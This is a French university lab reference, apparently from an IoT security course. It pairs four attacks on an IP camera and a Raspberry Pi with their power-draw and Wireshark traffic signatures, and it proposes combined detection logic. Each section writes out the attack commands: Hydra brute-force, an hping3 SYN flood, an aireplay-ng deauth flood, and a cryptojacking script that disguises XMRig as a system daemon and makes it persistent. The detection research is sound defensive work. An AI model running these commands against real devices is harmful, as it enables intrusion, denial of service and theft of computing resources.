# Référence des signatures d'attaque — Détection sur capteurs IoT

> Document de référence associant chaque attaque testée à ses signatures observables
> dans deux canaux hors-bande indépendants : **courant électrique** et **trafic réseau**.
>
> Généré à partir des expériences sur une caméra IP Hosafe HX-2PT1 et un Raspberry Pi 4
> dans un réseau de laboratoire isolé (UQAC 8INF917, Hiver 2026).

---

## Synthèse

| Attaque | Cible | Δ énergie vs veille | Signature réseau | Confiance de détection |
|---------|-------|---------------------|------------------|----------------------|
| Brute-force HTTP | Caméra IP | +20 % | Flood HTTP 401, en-têtes Basic auth | **Moyenne** (énergie seule : faible ; réseau : élevée) |
| DoS inondation SYN | Caméra IP | +30 % | Avalanche de paquets SYN sans ACK | **Élevée** |
| Cryptojacking (XMRig) | Raspberry Pi | +200 % | Connexion TCP persistante vers pool de minage | **Critique** |
| DoS Wi-Fi Deauth | Raspberry Pi | +15–25 % | Trames 802.11 Deauth en rafale | **Élevée** (Wi-Fi uniquement) |

---

## Attaque 1 — Brute-force HTTP sur caméra IP

### Mise en œuvre
```bash
# Étape 1 : générer un dictionnaire
crunch 4 9 abc123 -c 500 -o dictionnaire.txt

# Étape 2 : attaque monothread Hydra avec délai
hydra -l admin -P dictionnaire.txt -t 1 -W 2 192.168.2.39 http-get /
# Trouvé : admin:admin12345
```

**Outil :** Hydra v9.6  
**IP cible :** 192.168.2.39 (puis 192.168.137.41)  
**Résultat :** Mot de passe `admin12345` trouvé — **aucun mécanisme de verrouillage de compte**

### Signature énergétique
| État | Moy. (A) | Max (A) |
|------|---------|---------|
| Veille | 0,08 | 0,10 |
| Brute-force actif | 0,10 | 0,12 |

**+20% vs veille.** L'augmentation est modeste : chaque tentative d'authentification
déclenche une légère charge CPU pour traiter l'en-tête HTTP Basic auth, mais le
processeur embarqué reste rapide.

> ⚠️ **Point clé :** Un seuil énergétique naïf **ne détecterait pas** de façon
> fiable un brute-force sur la caméra. À 0,10–0,12 A, elle ressemble presque à
> un dispositif en veille. L'analyse réseau est indispensable comme canal de
> détection principal.

### Signature réseau
- **Filtre Wireshark :** `http && http.authorization`
- **Pattern :** Répétition de requêtes `GET / HTTP/1.1` avec `Authorization: Basic <base64>`
- **Aucun HTTPS** — identifiants visibles en clair sur n'importe quel segment réseau
- **Réponses :** caméra renvoie `HTTP/1.1 401 Unauthorized` à chaque mauvaise tentative

```
Filtres Wireshark pour isoler l'attaque :
  http.response.code == 401
  http.authorization contains "Basic"
```

---

## Attaque 2 — DoS par inondation SYN sur caméra IP

### Mise en œuvre
```bash
# 1000 paquets SYN par seconde, ciblant le port d'administration web
hping3 192.168.137.41 -S -p 80 -i u1000
# Envoyé : 80073 paquets
```

**Outil :** hping3  
**Résultat :** Interface d'administration inaccessible ; flux RTSP gelé

### Signature énergétique
| État | Moy. (A) | Max (A) |
|------|---------|---------|
| Veille | 0,08 | 0,10 |
| Inondation SYN active | 0,12 | 0,13 |

**+30% vs veille.** La pile réseau de la caméra est débordée : elle doit traiter
chaque SYN entrant, allouer une entrée de connexion à moitié ouverte, puis
éventuellement expirer — générant une surcharge CPU/mémoire mesurable.

### Signature réseau
- **Filtre Wireshark :** `tcp.flags.syn==1 && tcp.flags.ack==0`
- **Pattern :** Avalanche de paquets TCP SYN depuis une seule IP source, tous vers `port dst 80`
- **Alerte :** Wireshark signale "TCP Port numbers reused"
- **Conséquence :** Table de connexions de la caméra remplie → trafic légitime rejeté

```
Dans la capture du labo (dos_synflood_camera.pcapng) :
  IP source        : 192.168.137.1 (Kali)
  IP destination   : 192.168.137.41 (Caméra)
  Port destination : 80
  Débit            : ~1000 SYN/s
  Drapeau SYN      : activé  (0x002)
  Drapeau ACK      : désactivé → pas de poignée de main à trois voies
```

---

## Attaque 3 — Cryptojacking via XMRig (Raspberry Pi)

### Mise en œuvre
Après accès SSH (mot de passe `123456` pour l'utilisateur `pi`) :

```bash
# Script de post-exploitation déployé sur le Pi : crytojacking2.sh

# 1. Mise à jour système + installation des dépendances
apt-get update && apt-get install -y build-essential cmake libssl-dev

# 2. Compilation de XMRig depuis les sources pour ARM
git clone https://github.com/xmrig/xmrig
cd xmrig && mkdir build && cd build
cmake .. && make -j$(nproc)

# 3. Renommage du binaire pour simuler un processus système légitime
cp xmrig /usr/local/bin/system-update-daemon

# 4. Création du service systemd pour persistance + redémarrage automatique
cat > /etc/systemd/system/system_update_daemon.service << EOF
[Unit]
Description=System Update Daemon

[Service]
ExecStart=/usr/local/bin/system-update-daemon --config /etc/systemd/update.json
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable system_update_daemon
systemctl start system_update_daemon
```

**Pool de minage :** Monero (XMR) via `rx.unmineable.com` (IP : 209.38.61.60)  
**Adresse portefeuille (labo) :** 49peqkE3aPWG4kPD...0GM7rm7p83X4XX1  
**Résultat confirmé :** 0,00000004 XMR accumulés, visibles sur le tableau de bord unmineable.com

### Signature énergétique
| État | Moy. (A) | Max (A) |
|------|---------|---------|
| Veille | 0,30 | 0,36 |
| Cryptojacking actif | 0,92 | 1,01 |

**+200% vs veille.** La signature énergétique la plus forte de toutes les attaques testées.
XMRig sature tous les cœurs CPU (htop : `system_update_daemon` à **97,6% CPU**,
mémoire **691 Mo / 1,80 Go**). Incontestable rien que par l'énergie.

### Signature réseau
- **Phase 1 — Résolution DNS :** le Pi interroge `rx.unmineable.com` → chaîne CNAME →
  résout vers `209.38.61.60` (pool de minage)
- **Phase 2 — Connexion TCP au pool :** le Pi (10.42.0.241) établit une session TCP
  persistante vers 209.38.61.60:80
- **Phase 3 — Protocole Stratum :** échanges continus PSH/ACK, les charges utiles contiennent
  des messages du protocole de minage (soumissions de calcul + réception de nouvelles tâches)

```
Filtres Wireshark :
  dns.qry.name contains "unmineable"                      # Phase 1 : DNS
  ip.dst == 209.38.61.60                                  # Phase 2 : connexion pool
  tcp && ip.dst == 209.38.61.60 && tcp.flags.psh==1       # Phase 3 : échange de données
```

> **Technique d'évasion observée :** XMRig utilise le port TCP 80 (port HTTP standard)
> plutôt que le port Stratum par défaut 3333 — contourne les règles de pare-feu
> basées sur les ports. Le nom de processus `system_update_daemon` est conçu pour
> se fondre dans les services systemd légitimes dans `ps` ou `htop`.

---

## Attaque 4 — DoS par désauthentification Wi-Fi (Raspberry Pi)

### Mise en œuvre
```bash
# Étape 1 : activer le mode monitor sur l'interface Kali
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Étape 2 : identifier la cible
# Réseau "shadow" : BSSID 10:68:38:B2:58:EB, Canal 6
# MAC Pi : E4:5F:01:C8:64:8B
sudo airodump-ng wlan0

# Étape 3 : lancer l'inondation deauth
sudo aireplay-ng --deauth 0 -a 10:68:38:B2:58:EB -c E4:5F:01:C8:64:8B wlan0
```

**Adaptateur utilisé :** Alfa AWUS036ACS (RTL8812AU, mode monitor + injection de paquets)  
**Résultat :** Le Pi perd immédiatement la connectivité Wi-Fi ; chaque tentative de reconnexion est interrompue

### Signature énergétique
| État | Moy. (A) | Max (A) |
|------|---------|---------|
| Veille (Wi-Fi connecté) | 0,30 | 0,36 |
| Inondation deauth active | 0,37 | 0,40 |

**+15–25% vs veille.** Augmentation modérée : le pilote Wi-Fi du Pi tente une
réassociation après chaque deauth, déclenchant une activité CPU + RF supplémentaire.
Nettement plus faible que le cryptojacking — l'énergie seule n'est pas concluante.

### Signature réseau (couche 802.11)
- **Filtre Wireshark :** `wlan.fc.type == 0 && wlan.fc.subtype == 12`
- **Pattern :** Trames de désauthentification en rafales continues, alternant avec
  les tentatives d'association/réassociation du Pi
- **Cycle visible :** Deauth → Pi tente de se réassocier → nouveau Deauth immédiat →
  confirmant que le DoS est actif

```
Détails des trames (capture du labo) :
  Type/Sous-type  : 0x00C0 (Gestion / Désauthentification)
  Code raison     : 7 (Trame de classe 3 reçue d'une STA non associée)
  Source (BSSID)  : AzureWaveTec (10:68:38:B2:58:EB) — PA usurpé
  Destination     : RaspberryPiT (E4:5F:01:C8:64:8B) — MAC du Pi
```

> **Aucune alerte IDS/IPS générée** pendant le test — le point d'accès
> n'a pas détecté ni bloqué l'inondation de désauthentification 802.11w,
> confirmant l'absence de Protection des trames de gestion (802.11w PMF).

---

## Stratégie de détection combinée

Pour un déploiement en bâtiment intelligent / infrastructure IoT PoE :

```
Signal               | Point de collecte              | Outil
─────────────────────┼────────────────────────────────┼──────────────────────────────
Courant électrique   | ACS712 + Arduino sur chaque    | serial_logger.py → CSV
                     | circuit PoE                    |
─────────────────────┼────────────────────────────────┼──────────────────────────────
Trafic réseau        | Port SPAN sur switch principal | Wireshark / traffic_analyzer.py
                     | ou tap réseau inline            |
─────────────────────┼────────────────────────────────┼──────────────────────────────
Corrélation          | Station de surveillance        | Corréler pic énergétique avec
                     | (Ubuntu / SIEM)                | pattern trafic anormal
```

**Logique de décision :**
```
SI courant > moy_veille + 2σ
  ET (inondation_syn OU flood_http_401 OU connexion_pool_minage)
  → HAUTE CONFIANCE — alerte
SINON SI courant > moy_veille + 1σ ET anomalie_reseau
  → CONFIANCE MOYENNE — investigation
SINON SI anomalie_reseau UNIQUEMENT (énergie dans la plage normale)
  → FAIBLE CONFIANCE — journaliser et surveiller
```

> **Résultat principal :** pour la **caméra IP**, l'analyse réseau est le canal
> de détection primaire (les signatures énergétiques sont trop proches de la
> veille pour le brute-force et le DoS). Pour le **Raspberry Pi**, l'énergie est
> un signal primaire fort pour le cryptojacking. L'analyse combinée réduit
> significativement les faux positifs.
